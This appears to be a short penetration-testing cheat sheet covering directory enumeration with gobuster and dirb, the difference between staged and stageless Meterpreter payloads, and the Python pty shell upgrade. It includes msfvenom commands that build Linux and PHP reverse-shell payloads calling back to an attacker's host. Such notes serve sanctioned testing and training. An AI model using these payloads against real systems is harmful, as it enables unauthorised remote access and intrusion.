# Pentesting

### FTP
`binary` / `ascii` switch how the file is being downloaded

## HTTP
Enumerate directories

`gobuster -e -u http://192.168.0.155/ -w /usr/share/wordlists/dirb/common.txt`

`dirb http://DOMAIN.TLD`

## MSFVenom Payload Generation
### Staged vs Stageless Payloads
#### Staged Payloads
A staged payload is simply a payload that is as compact as possible and performs the single task of providing the means for an attacker to upload something bigger.

The initial shellcode (often referred to as stage0) may create a new connection back to the attacker's machine and read a larger payload into memory. Once the payload has been received, stage0 passes control to the new, larger payload.

In Metasploit terms, this payload is called reverse_tcp, and the second stage (stage1) might be a standard command shell, or it might be something more complex, such as a Meterpreter shell or a VNC session. There are other staged options such as reverse_https and bind_tcp, both of which provide different transport options for opening the doorway for the second stage.

##### Using Staged Payloads
Notice meterpreter/reverse_tcp

`msfvenom -p / set payload PLATFORM/ARCH/meterpreter/reverse_tcp`

#### Stageless Payloads
As with the staged version, stageless Meterpreter payloads begin with a small bootstrapper. However, this bootstrapper looks very different. Staged Meterpreter payload bootstrappers contain shellcode that performs network communications in order to read in the second stage prior to invoking it. The stageless counterparts don't have this responsibility, as it is instead handled by metsrv itself. As a result, what we know as stage0 completely disappears.

Instead, that which is known as stage1 in staged Meterpreter land becomes the bootstrapper for the payload in stageless Meterpreter land. 

##### Using Stageless Payloads
Notice meterpreter_reverse_tcp

`msfvenom -p / set payload PLATFORM/ARCH/meterpreter_reverse_tcp`

#### Staged Linux Meterpreter Payloads
`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=1337 -f elf > shell64.elf`

`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=1337 -f elf > shell86.elf`

#### Stageless PHP Meterpreter Payload
`msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=1337 -f raw > shell.php`

#### Staged PHP Meterpreter Payload
`msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=1337 -f raw > shell.php`

# PrivEsc
## Escape Shell
`python -c 'import pty;pty.spawn("/bin/bash")'`

## Compiling an Exploit written in C for a 32 Bit Arch on a 64 Bit Arch
`gcc -m32 exploit.c -o exploit`
